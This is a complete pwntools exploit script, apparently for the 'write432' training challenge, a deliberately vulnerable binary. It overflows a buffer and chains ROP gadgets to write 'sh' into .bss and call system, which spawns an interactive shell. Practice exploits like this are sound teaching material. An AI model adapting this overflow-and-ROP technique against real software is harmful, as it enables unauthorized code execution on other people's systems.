# -*- coding: utf-8 -*-
from pwn import *
p = process('./write432')
p.recvuntil("> ")
# ROPgadget --binary ./write432 --only "mov|ret"
# 0x08048670 : mov dword ptr [edi], ebp ; ret
mov_edi_ebp = 0x08048670
# ROPgadget --binary ./write432 --only "pop|ret"
# 0x080486da : pop edi ; pop ebp ; ret
pop_edi_ebp_ret = 0x080486da
call_system = 0x08048430
bss_addr = 0x0804a040
sh = "sh\x00\x00"


payload = "a" * 44 
payload += p32(pop_edi_ebp_ret)
payload += p32(bss_addr)
payload += sh
payload += p32(mov_edi_ebp)
payload += p32(call_system)
payload += "aaaa"
payload += p32(bss_addr)

p.sendline(payload)
p.interactive()


